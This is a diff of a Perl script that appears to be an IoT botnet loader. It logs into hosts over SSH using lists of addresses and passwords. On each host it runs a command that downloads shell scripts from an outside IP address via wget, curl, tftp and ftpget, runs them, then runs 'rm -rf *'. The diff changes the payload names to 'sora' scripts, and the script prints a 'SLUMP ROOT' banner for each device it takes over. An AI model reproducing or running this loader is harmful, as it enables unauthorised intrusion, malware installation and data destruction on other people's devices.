@@ -16,7 +16,7 @@ scalar(@newarray); $i+=3) {
         if ($ssh->connect($newarray[$c])) {
                 if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                         $channel = $ssh->channel();
-                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.188/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.181.80.188 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.181.80.188; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.181.80.188 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
+                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.188/sora.sh; curl -O http://5.181.80.188/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 5.181.80.188 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 5.181.80.188; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.181.80.188 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *');
                         sleep 10;
                         $channel->close;
                         print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
